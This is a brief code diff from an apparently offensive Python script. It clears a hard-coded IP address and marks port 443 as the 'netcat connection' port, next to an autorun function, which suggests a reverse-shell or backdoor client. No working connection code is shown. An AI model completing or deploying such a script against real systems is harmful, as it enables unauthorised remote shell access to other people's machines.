@@ -4,8 +4,8 @@ import subprocess
 import threading
 import os
 
-IP = "192.168.100.104"
-PORT = 443
+IP = ""
+PORT = 443 #POR DA CONEXAO DO NETCAT
 
 
 def autorun():
